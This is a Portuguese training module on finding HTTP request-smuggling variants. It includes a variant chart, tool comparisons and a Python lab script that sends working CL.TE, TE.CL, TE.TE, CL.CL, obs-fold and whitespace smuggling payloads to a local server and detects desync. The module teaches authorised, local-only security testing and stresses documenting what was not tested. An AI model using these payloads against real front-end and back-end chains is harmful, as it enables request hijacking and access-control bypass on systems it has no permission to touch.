# Módulo 9 — Encontrar a Variante

**Carga:** 3 horas (1h teoria · 2h lab)
**Pré-requisitos:** Módulos 1 a 8

---

## Objetivos

1. Aplicar o **padrão abstraído** do Parser Differentials a uma cadeia nova.
2. Construir a **carta de variantes** de um alvo — antes de testar.
3. Usar as ferramentas de detecção **com julgamento**.
4. Transformar a detecção em **espaço de busca sistemático**.
5. Saber quando **parar** — e declarar o que não foi testado.

---

## ⚠ Antes de começar

⚠ **A afirmação que organiza o módulo:**

> **Você não "acha" uma variante.** **Você varre um espaço** — **e o espaço é definido pela carta,
> não pela sua imaginação.**

⚠ **E é o mesmo método do módulo 10 do Parser Differentials, com o escopo maior:** **lá, o padrão era
uma pergunta;** **aqui, o padrão é uma **lista de variantes** com o que cada uma exige.**

⚠ **A tese:**

> **A variante é o par (forma, tolerância).** **E a forma está na tabela do módulo 4; a tolerância
> está no produto.** **Você cruza as duas — e o espaço é finito.**

⚠ **A tabela do que a carta contém, por variante:**

| Campo | Valor |
|---|---|
| **A variante** | Da tabela do módulo 4 |
| **O que ela exige** | Dois headers? Um parser antigo? Conversão? |
| ⚠ **A cadeia tem?** | Sim / não / não sei |
| ⚠ **Prioridade** | O que testar primeiro |
| **O que eu NÃO testei** | ⚠ Obrigatório |

⚠ **A linha do "não sei" é honesta e necessária.** **Você não sabe se o produto converte H2→H1 até
ler a config** — **e o módulo 10 dá o instrumento para descobrir.**

---

## 9.1 O padrão, e o espaço

⚠ **O padrão abstraído do curso anterior, aplicado aqui:**

| Padrão (Parser Differentials) | Aplicado ao smuggling |
|---|---|
| "onde a spec deixa em aberto" | ⚠ **Onde o framing é inferido** |
| "a pergunta que atravessa implementações" | ⚠ **"Este produto lê com qual regra?"** |
| "liste as implementações" | ⚠ **Liste as variantes** |
| "verifique por leitura" | ⚠ **Leia a config**

⚠ **A pergunta que atravessa tudo, e ela é uma só:**

> **"O que esta camada entrega à próxima?"** **Se entrega os bytes originais, ela mantém a
> divergência viva.**

⚠ **E a tabela do que responder, por camada:**

| Camada | O que entrega | ⚠ Vulnerável? |
|---|---|---|
| Proxy reverso | ⚠ Original | ⚠ Sim |
| Reencode | ⚠ Normalizado | Talvez |
| WAF | ⚠ Original | ⚠ Sim |
| CDN | ⚠ Original | ⚠ Sim |
| ⚠ **Cache** | **A resposta armazenada** | ⚠ Outro efeito |

⚠ **A linha do reencode é a que exige leitura.** **Um proxy que reencoda pode **eliminar** a
divergência — **ou **criar** uma nova.** **Você não sabe sem ler a config.**

⚠ **E a tabela das variantes por **custo de teste**, que é o filtro econômico:**

| Custo | Variantes | Por quê |
|---|---|---|
| ⚠ **Um byte** | Espaço, obs-fold | Nada a preparar |
| Dois headers | CL.TE, TE.CL, TE.TE, CL.CL | Trivial |
| ⚠ Backend que não lê | CL.0 | Exige endpoint |
| ⚠ Conversão | H2→H1 | Exige cliente H2 |
| ⚠ Navegador | Client-side | Exige página |

⚠ **A regra escrita:**

> **Comece pelo que custa um byte.** **Antes de montar o cliente H2, teste se o parser aceita um
> espaço.**

```bash
mkdir -p ~/smuggle-lab/mod09 && cd ~/smuggle-lab/mod09

echo "═══ 1. o padrão e o espaço ═══"
echo
cat > padrao.md <<'EOF'
# O padrão, e o espaço

| Padrão (Parser Differentials) | Aplicado ao smuggling |
|---|---|
| onde a spec deixa em aberto | ⚠ onde o FRAMING é inferido |
| a pergunta que atravessa | ⚠ "este produto lê com qual REGRA?" |
| liste as implementações | ⚠ liste as VARIANTES |
| verifique por leitura | ⚠ leia a CONFIG |

## A pergunta única
⚠ "o que esta camada ENTREGA à próxima?"
se entrega os bytes ORIGINAIS, ela mantém a divergência VIVA.

## Por camada
| Camada | O que entrega | Vulnerável? |
|---|---|---|
| proxy reverso | original | sim |
| reencode | normalizado | talvez |
| WAF | original | sim |
| CDN | original | sim |
| ⚠ cache | a resposta armazenada | ⚠ outro efeito |

## As variantes por CUSTO de teste
| Custo | Variantes | Por quê |
|---|---|---|
| ⚠ UM BYTE | espaço, obs-fold | nada a preparar |
| dois headers | CL.TE, TE.CL, TE.TE, CL.CL | trivial |
| backend que não lê | CL.0 | exige endpoint |
| conversão | H2→H1 | exige cliente H2 |
| navegador | client-side | exige página |

## ⚠ A REGRA
comece pelo que custa UM BYTE.
antes de montar o cliente H2, teste se o parser aceita um ESPAÇO.
EOF

cat padrao.md
```

⚠ **A tabela de custo é o instrumento econômico.** **E a regra é o que a maioria inverte** —
**começando pela variante famosa em vez da barata.**

⚠ **E a pergunta única é a do curso inteiro:** **"o que esta camada entrega à próxima?"** **É ela que
decide a vulnerabilidade, não a idade do produto.**

**Produza `padrao.md`:**

| Custo | Variantes |
|---|---|
| Um byte | |
| Dois headers | |
| Conversão | |

**Responda:**

1. **Qual a pergunta única?** Por que ela decide?
2. **O que o reencode pode fazer?**
3. **Por que começar pelo que custa um byte?**
4. **O que o padrão tem de igual** ao Parser Differentials?

---

## 9.2 A carta de variantes

⚠ **O instrumento do módulo. E ela é a hipótese.**

| # | A variante | Exige | ⚠ A cadeia tem? | Prioridade |
|---|---|---|---|---|
| 1 | Espaço no valor | ⚠ Nada | | ⚠ **1** |
| 2 | Espaço antes do `:` | ⚠ Nada | | ⚠ **2** |
| 3 | CL.TE | Dois headers | | 3 |
| 4 | TE.CL | Dois headers | | 4 |
| 5 | TE.TE | Parser tolerante | | 5 |
| 6 | CL.CL | Não rejeitar | | 6 |
| 7 | Obs-fold | Parser antigo | | 7 |
| 8 | CL.0 | Endpoint que não lê | | 8 |
| 9 | H2→H1 | Conversão | | 9 |
| 10 | Client-side | Navegador | | 10 |

⚠ **A prioridade é econômica, e a ordem é deliberada.** **O que custa um byte vem primeiro; o que
exige infraestrutura vem depois.**

⚠ **E a coluna "a cadeia tem?" é o filtro.** **Se a cadeia não faz conversão H2→H1, a variante 9 não
se aplica** — **e você não perde tempo nela.**

⚠ **A tabela do que preencher na coluna "a cadeia tem?", por variante:**

| Variante | Como saber |
|---|---|
| Espaço | ⚠ Testar |
| CL.TE / TE.CL | ⚠ **Medir a regra de cada camada** (módulo 2) |
| TE.TE | Testar a ofuscação |
| CL.0 | ⚠ **Ver se o endpoint responde antes de ler** |
| H2→H1 | ⚠ **Ler a config — `http2` na frente, H1 atrás?** |
| Client-side | ⚠ **O produto reusa conexão?** |

⚠ **A regra escrita:**

> **A carta é a hipótese, e a prioridade é a economia.** **Você testa o barato primeiro** — **e
> frequentemente o barato funciona.**

```bash
cd ~/smuggle-lab/mod09

echo "═══ 2. a carta de variantes ═══"
echo
cat > carta-variantes.md <<'EOF'
# Carta de variantes

## O alvo
| Item | Valor |
|---|---|
| A cadeia | |
| As camadas | |
| ⚠ A config (lida?) | |

## As variantes
| # | Variante | Exige | ⚠ A cadeia tem? | Prioridade | Testada? | Resultado |
|---|---|---|---|---|---|---|
| 1 | espaço no valor | nada | | 1 | | |
| 2 | espaço antes do : | nada | | 2 | | |
| 3 | CL.TE | dois headers | | 3 | | |
| 4 | TE.CL | dois headers | | 4 | | |
| 5 | TE.TE | parser tolerante | | 5 | | |
| 6 | CL.CL | não rejeitar | | 6 | | |
| 7 | obs-fold | parser antigo | | 7 | | |
| 8 | CL.0 | endpoint que não lê | | 8 | | |
| 9 | H2 → H1 | conversão | | 9 | | |
| 10 | client-side | navegador | | 10 | | |

## As que eu DESCARTEI, e por quê
| # | Variante | Por quê não se aplica |
|---|---|---|
| | | |

## A hipótese principal
| Campo | Valor |
|---|---|
| Afirmação | |
| Observação | |
| ⚠ Falsificação | |

## ⚠ O que eu NÃO vou testar, e por quê
| Variante | Por quê |
|---|---|
| | sem a condição |
| | exige infraestrutura que não tenho |
| | ⚠ fora do escopo autorizado |
EOF

cat carta-variantes.md
```

⚠ **A carta é o que substitui a tentativa e erro.** **E a coluna "descartei" é obrigatória** —
**porque declarar o que não se aplica é parte do método.**

⚠ **E a hipótese com falsificação é a do módulo 6 do Pesquisa.** **Sem ela, a carta é uma lista.**

**Produza `carta.md`:**

| # | Variante | Prioridade | A cadeia tem? |
|---|---|---|---|
| 1 | Espaço | | |
| 3 | CL.TE | | |
| 9 | H2→H1 | | |

**Responda:**

1. **Quais variantes custam um byte?** Por que vêm primeiro?
2. **O que você descartou?** Por quê?
3. **A hipótese tem falsificação?**
4. **O que você não vai testar?**

---

## 9.3 As ferramentas

⚠ **As ferramentas de detecção. E o que cada uma faz — e não faz.**

| Ferramenta | O que faz | ⚠ O que NÃO faz |
|---|---|---|
| **`smuggler`** | Testa variantes conhecidas | ⚠ **Não julga o resultado** |
| **Burp (Community)** | Intercepta e repete | ⚠ Manual |
| **HTTP Garden** | Compara N servidores | ⚠ Escopo é a comparação |
| ⚠ **O seu harness** | ⚠ **Mede com as 4 saídas** | ⚠ Não classifica |

⚠ **A primeira linha é a mais usada e a mais mal usada.** **O `smuggler` manda as variantes
conhecidas e **reporta o que ele acha** — **e o "acha" dele é heurístico.** **Você confirma com o
seu harness.**

⚠ **A tabela do que a ferramenta dá e o que você acrescenta:**

| Etapa | Ferramenta | Você |
|---|---|---|
| achar a variante | ✓ candidatos | — |
| ⚠ medir | — | ⚠ **o harness** |
| ⚠ classificar | — | ⚠ **a cascata** |
| confirmar | — | ⚠ **o log do backend** |
| reportar | — | ⚠ **você** |

⚠ **A última linha fecha o método.** **A ferramenta reduz o espaço; o julgamento é seu.**

⚠ **E a armadilha do `smuggler`, escrita:**

> **O `smuggler` reporta "possível" com base em timing e resposta.** **Timing é o mais frágil dos
> sinais** — **e é o que produz falso positivo.** **Você confirma com a contagem no log.**

⚠ **A regra escrita:**

> **Ferramenta dá candidato; o log dá prova.** **E a prova é a string que você escreveu aparecendo
> onde não devia.**

```bash
cd ~/smuggle-lab/mod09

echo "═══ 3. as ferramentas ═══"
echo
cat > ferramentas.md <<'EOF'
# As ferramentas

| Ferramenta | O que faz | O que NÃO faz |
|---|---|---|
| `smuggler` | testa variantes conhecidas | ⚠ não julga |
| Burp | intercepta e repete | ⚠ manual |
| HTTP Garden | compara N servidores | ⚠ escopo é a comparação |
| ⚠ o SEU harness | ⚠ mede com as 4 saídas | não classifica |

## O que a ferramenta dá × o que você acrescenta
| Etapa | Ferramenta | Você |
|---|---|---|
| achar a variante | ✓ candidatos | — |
| ⚠ medir | — | ⚠ o harness |
| ⚠ classificar | — | ⚠ a cascata |
| confirmar | — | ⚠ o log do backend |
| reportar | — | ⚠ você |

## ⚠ a armadilha do smuggler
ele reporta "possível" com base em TIMING e resposta.
⚠ timing é o MAIS FRÁGIL dos sinais —
e é o que produz FALSO POSITIVO.
✓ confirme com a CONTAGEM no log.

## ⚠ A REGRA
ferramenta dá CANDIDATO. o log dá PROVA.
e a prova é a STRING que você escreveu
aparecendo onde não devia.
EOF

cat ferramentas.md

echo
echo "═══ 4. o espaço de busca, gerado ═══"
echo
cat > gera-espaco.py <<'PY'
#!/usr/bin/env python3
"""
gera-espaco.py — gera o espaço de variantes para um alvo.

⚠ não testa. GERA a lista, com o que cada uma exige.
   e você a ordena por PRIORIDADE (o barato primeiro).
"""

VARINATES = [
    ("1. espaço no valor", 1, "nada", "CL: 6 "),
    ("2. espaço antes do :", 1, "nada", "CL : 6"),
    ("3. espaço no início", 1, "nada", " CL: 6"),
    ("4. dois espaços", 1, "nada", "CL:  6"),
    ("5. tab no valor", 1, "nada", "CL:\t6"),
    ("6. CL.TE", 3, "dois headers", "CL menor + TE"),
    ("7. TE.CL", 3, "dois headers", "CL mente, chunk certo"),
    ("8. TE.TE (xchunked)", 5, "parser tolerante", "TE + TE ofuscado"),
    ("9. TE.TE (espaço no : )", 5, "parser tolerante", "TE + 'TE :'"),
    ("10. CL.CL", 6, "não rejeitar", "dois CL, valores opostos"),
    ("11. obs-fold", 7, "parser antigo", "continuação com tab"),
    ("12. chunk com espaço", 7, "parser tolerante", "5 ;ext"),
    ("13. CL.0", 8, "endpoint que não lê", "um CL, backend ignora"),
    ("14. H2.CL", 9, "conversão", "content-length: 0 no H2"),
    ("15. H2.TE", 9, "conversão", "te: chunked no H2"),
    ("16. H2 CRLF", 9, "conversão", "nome com \\r\\n"),
    ("17. client-side", 10, "navegador", "fetch + reuso de conexão"),
]


def main():
    print("═══ ESPAÇO DE VARIANTES ═══")
    print()
    print(f"  total: {len(VARINATES)} variantes")
    print()
    print(f"  {'#':<4} {'variante':<26} {'prio':<6} {'exige':<24} forma")
    print("  " + "-"*88)
    for nome, prio, exige, forma in sorted(VARINATES, key=lambda x: x[1]):
        marca = "⚠" if prio <= 2 else " "
        print(f"  {marca:<4} {nome:<26} {prio:<6} {exige:<24} {forma}")
    print()
    print("  ═══ COMO USAR ═══")
    print("  · ⚠ comece pela PRIORIDADE 1: custa um byte, nada a preparar")
    print("  · e descarte as que a cadeia não tem (módulo 9.2)")
    print()
    print("  zero")
    print()


if __name__ == "__main__":
    main()
PY

chmod +x gera-espaco.py
python3 gera-espaco.py
```

⚠ **O gerador do espaço é o instrumento do módulo.** **E a ordenação por prioridade é o que evita
que você comece pelo difícil.**

⚠ **E a armadilha do `smuggler` merece repetição:** **ele usa **timing**, que é o sinal mais frágil**
— **e que produz falso positivo.** **A contagem no log é a prova.**

**Produza `ferramentas.md`:**

| Ferramenta | O que faz | O que não faz |
|---|---|---|
| `smuggler` | | |
| O seu harness | | |

**Responda:**

1. **Qual ferramenta dá candidato?** Qual dá prova?
2. **Por que o timing é frágil?**
3. **Quantas variantes o espaço tem?**
4. **Qual é a prioridade 1?**

---

## 9.4 LAB — A carta aplicada

**Duração:** 120 min

### Passo 1 — Monte a carta do seu alvo (40 min)

⚠ **O alvo é o seu lab. E a carta vem antes do teste.**

```bash
cd ~/smuggle-lab/mod09

echo "═══ MONTANDO A CARTA ═══"
echo
cat <<'EXPL'
  ── O ALVO É A SUA CADEIA ──

     a do módulo 5 (nginx → backend) ou a do 6 (H2 → H1)

  ── O QUE FAZER ──

     1. liste as camadas e o que cada uma ENTREGA
     2. ⚠ leia a CONFIG — descubra as regras
     3. preencha a coluna "a cadeia tem?"
     4. ordene por prioridade
     5. e DESCARTE o que não se aplica
EXPL

cat > caderno/PD-009.md <<'EOF'
# PD-009 — a carta de variantes

**Data:** ____

## 1. O alvo
| Camada | Produto | Versão | ⚠ O que ENTREGA |
|---|---|---|---|
| | | | |
| | | | |

## 2. A config (lida?)
| Diretiva | Valor | ⚠ O que revela |
|---|---|---|
| proxy_http_version | | |
| chunked_transfer_encoding | | |
| http2 | | |

## 3. A carta
| # | Variante | Exige | ⚠ A cadeia tem? | Testada? | Resultado |
|---|---|---|---|---|---|
| 1 | espaço no valor | nada | | | |
| 2 | espaço antes do : | nada | | | |
| 3 | CL.TE | dois headers | | | |
| 4 | TE.CL | dois headers | | | |
| 5 | TE.TE | parser tolerante | | | |
| 6 | CL.CL | não rejeitar | | | |
| 7 | obs-fold | parser antigo | | | |
| 8 | CL.0 | endpoint que não lê | | | |
| 9 | H2 → H1 | conversão | | | |
| 10 | client-side | navegador | | | |

## 4. As DESCARTADAS
| # | Variante | Por quê |
|---|---|---|
| | | |

## 5. A hipótese
| Campo | Valor |
|---|---|
| Afirmação | |
| Observação | |
| ⚠ Falsificação | |

## 6. ⚠ O que eu NÃO vou testar
| Variante | Por quê |
|---|---|
| | |

## 7. O isolamento
| Item | Valor |
|---|---|
| tudo em | 127.0.0.1 |
| ⚠ terceiros | NENHUM |

## 8. O que NÃO foi verificado
⚠ mínimo 3
EOF

cat caderno/PD-009.md | head -30
```

**Produza `carta.md`:**

| # | Variante | A cadeia tem? | Descartada? |
|---|---|---|---|
| 1 | Espaço | | |
| 3 | CL.TE | | |
| 9 | H2→H1 | | |

**Responda:**

1. **Quantas variantes se aplicam?
2. **Quantas você descartou?** Por quê?
3. **O que cada camada entrega?
4. **A hipótese tem falsificação?**

### Passo 2 — Varra por prioridade (55 min)

⚠ **A varredura: do barato ao caro. E você **para** quando acha.**

```bash
cd ~/smuggle-lab/mod09

echo "═══ VARRENDO POR PRIORIDADE ═══"
echo
cat <<'EXPL'
  ── A ORDEM ──

     PRIORIDADE 1: espaço (1 byte, nada a preparar)
     PRIORIDADE 2: os dois headers
     PRIORIDADE 3: as duplicatas e ofuscações
     PRIORIDADE 4: CL.0 (exige o endpoint)
     PRIORIDADE 5: H2 → H1 (exige cliente H2)

  ── ⚠ E A REGRA DA VARREDURA ──
     · rode a variante
     · leia a CONTAGEM e a MARCA
     · classifique com as 4 saídas
     · ⚠ se DER DESYNC: pare e documente com cuidado
     · se NÃO der: próxima
     · se INDETERMINADO: ⚠ RECONFIRA antes de seguir

  ⚠ não pule o indeterminado.
     ele vira conclusão errada depois.
EXPL

cat > varre.py <<'PY'
#!/usr/bin/env python3
"""
varre.py — varre as variantes por PRIORIDADE.

⚠ DIDÁTICO e LOCAL (127.0.0.1). usa as 4 saídas do módulo 5.
"""
import socket, sys, os, time, uuid

HOST = "127.0.0.1"
PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 8081
LOG = sys.argv[2] if len(sys.argv) > 2 else os.path.expanduser(
    "~/smuggle-lab/evidencia/backend-cl.log")


def conta():
    try:
        with open(LOG) as f:
            t = f.read()
        return t.count("═══ requisição #"), t
    except FileNotFoundError:
        return 0, ""


def roda(nome: str, payload: bytes, marca: str, timeout=5) -> str:
    antes, _ = conta()
    resp = ""
    sem_resp = False
    try:
        with socket.create_connection((HOST, PORT), timeout=timeout) as s:
            s.sendall(payload)
            s.settimeout(2)
            try:
                r = s.recv(8192)
                resp = r.split(b"\r\n")[0].decode(errors="replace") if r else ""
                if not r: sem_resp = True
            except socket.timeout:
                pass
    except Exception:
        sem_resp = True

    time.sleep(0.3)
    depois, txt = conta()
    n = depois - antes
    apareceu = marca in txt

    if apareceu or n >= 3:
        return "⚠ DESYNC"
    if resp.startswith("HTTP/1.1 4") or resp.startswith("HTTP/1.1 5"):
        return "REJEITADO"
    if sem_resp or n == 0:
        return "⚠ INDETERMINADO"
    return "SEM EFEITO"


def casos():
    """as variantes, por prioridade"""
    M = lambda: f"V{uuid.uuid4().hex[:6]}"

    # prioridade 1 — um byte
    for rot, h in [
        ("espaco no valor", b"Content-Length: 6 \r\n"),
        ("espaco antes do :", b"Content-Length : 6\r\n"),
        ("espaco no inicio", b" Content-Length: 6\r\n"),
        ("dois espacos", b"Content-Length:  6\r\n"),
    ]:
        m = M()
        yield (1, rot, b"POST / HTTP/1.1\r\nHost: l\r\n" + h + b"\r\nAAAAAA"
               b"GET /" + m.encode() + b" HTTP/1.1\r\nHost: l\r\n\r\n", m.decode())

    # prioridade 2 — dois headers
    m = M()
    yield (2, "CL.TE", b"POST / HTTP/1.1\r\nHost: l\r\nContent-Length: 6\r\n"
           b"Transfer-Encoding: chunked\r\n\r\n0\r\n\r\n"
           b"GET /" + m.encode() + b" HTTP/1.1\r\nHost: l\r\n\r\n", m.decode())

    m = M()
    yield (2, "TE.CL", b"POST / HTTP/1.1\r\nHost: l\r\nContent-Length: 4\r\n"
           b"Transfer-Encoding: chunked\r\n\r\n5c\r\n"
           b"GET /" + m.encode() + b" HTTP/1.1\r\nHost: l\r\n\r\n" + b"x"*40 + b"\r\n0\r\n\r\n",
           m.decode())

    # prioridade 3 — duplicatas
    m = M()
    yield (3, "TE.TE", b"POST / HTTP/1.1\r\nHost: l\r\n"
           b"Transfer-Encoding: chunked\r\nTransfer-Encoding: xchunked\r\n\r\n"
           b"0\r\n\r\nGET /" + m.encode() + b" HTTP/1.1\r\nHost: l\r\n\r\n", m.decode())

    m = M()
    yield (3, "CL.CL", b"POST / HTTP/1.1\r\nHost: l\r\nContent-Length: 6\r\n"
           b"Content-Length: 10\r\n\r\nAAAAAA"
           b"GET /" + m.encode() + b" HTTP/1.1\r\nHost: l\r\n\r\n", m.decode())

    # prioridade 3 — ofuscação
    m = M()
    yield (3, "obs-fold", b"POST / HTTP/1.1\r\nHost: l\r\n"
           b"Transfer-Encoding: chunked\r\n\t\r\n0\r\n\r\n"
           b"GET /" + m.encode() + b" HTTP/1.1\r\nHost: l\r\n\r\n", m.decode())


def main():
    print("═══ VARREDURA POR PRIORIDADE ═══")
    print()
    print(f"  alvo: {HOST}:{PORT}   ⚠ LOCAL")
    print()
    print(f"  {'prio':<6} {'variante':<22} {'SAÍDA':<18}")
    print("  " + "-"*48)

    achou = []
    for prio, nome, payload, marca in casos():
        saida = roda(nome, payload, marca)
        print(f"  {prio:<6} {nome:<22} {saida:<18}")
        if "DESYNC" in saida:
            achou.append((prio, nome))
        elif "INDETERMINADO" in saida:
            print(f"  {'':<6} {'':<22} ⚠ RECONFIRA antes de seguir")

    print()
    if achou:
        print("  ═══ ACHOU ═══")
        for prio, nome in achou:
            print(f"     · {nome} (prioridade {prio})")
        print()
        print("  ⚠ PARE e documente com cuidado: payload, log, contagem.")
    else:
        print("  ═══ NADA NESTA FAIXA ═══")
        print("     ⚠ e isso é RESULTADO — não fracasso.")
        print("     · as prioridades 1–3 não funcionaram aqui")
        print("     · próxima: CL.0 (exige o endpoint) e H2→H1")
    print()
    print("  ⚠ tudo local. nenhum serviço de terceiro.")


if __name__ == "__main__":
    main()
PY

chmod +x varre.py
echo "  ── pronto ──"
echo "     python3 ~/smuggle-lab/mod09/varre.py 8081"
```

⚠ **A varredura por prioridade é o instrumento.** **E ela **para** quando acha** — **porque
documentar bem um achado vale mais que varrer o resto.**

⚠ **E a nota do indeterminado é a disciplina do módulo 5:** **você reconfere **antes** de seguir** —
**senão a conclusão errada vem depois.**

**Produza `varredura.md`:**

| Prio | Variante | Saída |
|---|---|---|
| 1 | Espaço no valor | |
| 2 | CL.TE | |
| 3 | TE.TE | |

**Responda:**

1. **Quantas variantes deram desync?
2. **Alguma ficou indeterminada?** O que você fez?
3. **O que fazer quando acha?
4. **O que significa "nada nesta faixa"?

### Passo 3 — Registre e conclua (25 min)

Produza `relatorio-variante.md`:

```markdown
# Relatório — busca de variante

## 1. O alvo
| Camada | Produto | Versão | ⚠ Entrega |
|---|---|---|---|
| | | | |

## 2. A carta
| # | Variante | Prioridade | Testada | Saída |
|---|---|---|---|---|
| | | | | |

## 3. As descartadas
| Variante | Por quê |
|---|---|
| | |

## 4. O resultado da varredura
| Faixa de prioridade | Resultado |
|---|---|
| 1 (um byte) | |
| 2 (dois headers) | |
| 3 (duplicatas) | |
| 4+ (infraestrutura) | |

## 5. ⚠ A variante que funcionou
| Item | Valor |
|---|---|
| Qual | |
| Prio | |
| Por quê | |
| O payload (bytes) | |

## 6. A evidência literal
```
[frontend]
```
```
[backend]
```

## 7. ⚠ E SE NADA FUNCIONOU
| Item | Valor |
|---|---|
| o que testei | |
| o que NÃO testei | ⚠ OBRIGATÓRIO |
| o que isso significa | |

## 8. A classificação
| Item | Valor |
|---|---|
| categoria | |
| destinatários | |

## 9. ⚠ O que eu NÃO fiz
- [ ] não apontei para serviço de terceiro
- [ ] não testei CDN, WAF ou proxy alheio
- [ ] não usei o desync para acessar nada
- [ ] não publiquei

## 10. O que NÃO foi verificado
⚠ mínimo 3
```

**Produza `relatorio-variante.md`:**

| Item | Valor |
|---|---|
| Variante que funcionou | |
| Prio | |
| O que não testei | |
| Destinatários | |

**Responda:**

1. **Qual variante funcionou?** Em qual prioridade?
2. **Se nada funcionou, o que isso significa?** É resultado?
3. **O que você não testou?**
4. **Quem corrige?**

### Critérios de aceitação

- `padrao.md` com o **padrão** do Parser Differentials aplicado.
- Você escreveu **a pergunta única**.
- Você explicou **o que o reencode pode fazer**.
- A tabela de **custo de teste** com as cinco faixas.
- Você explicou **por que começar pelo que custa um byte**.
- `carta-variantes.md` com as **10** variantes e a prioridade.
- Você preencheu a coluna **"a cadeia tem?"`.
- Você listou **as que descartou, e por quê**.
- A hipótese tem **critério de falsificação**.
- Você listou **o que não vai testar**.
- `ferramentas.md` com a distinção **candidato × prova**.
- Você explicou **por que o timing é frágil** e gera falso positivo.
- `gera-espaco.py` produzindo o **espaço ordenado por prioridade**.
- A **carta do seu alvo** preenchida, com a config lida.
- A **varredura por prioridade** rodada.
- Você **parou ao achar**, e documentou.
- Você tratou os **indeterminados** antes de seguir.
- `caderno/PD-009.md` com as **oito** seções.
- `relatorio-variante.md` com as **dez** seções.
- Você declarou **o que não testou** — mesmo sem achar nada.
- ⚠ **Nenhum serviço de terceiro.**

---

## Avaliação

1. **O que você "acha" numa variante?** Ou varre?
2. **Qual é a pergunta única?** Por que ela decide?
3. **Cite o padrão** e o que ele tem de igual ao Parser Differentials.
4. **O que o reencode pode fazer** com a divergência?
5. **Cite as cinco faixas de custo.**
6. **Por que começar pelo que custa um byte?**
7. **O que a carta de variantes contém?**
8. **Por que a coluna "a cadeia tem?" filtra?**
9. **Por que listar as descartadas?**
10. **O que a hipótese precisa ter?**
11. **O que o `smuggler` faz?** E o que ele não faz?
12. **Por que o timing é o sinal mais frágil?**
13. **O que dá candidato?** O que dá prova?
14. **O que é a prova**, em uma frase?
15. **Cite as quatro saídas** e a ação de cada.
16. **O que fazer quando acha?**
17. **O que fazer com o indeterminado?** Por quê?
18. **O que significa "nada nesta faixa"?**
19. **Por que "nada" é resultado e não fracasso?
20. **O que declarar quando não se acha nada?**

---

**Próximo:** [Módulo 10 — Detecção e defesa](modulo-10.md)
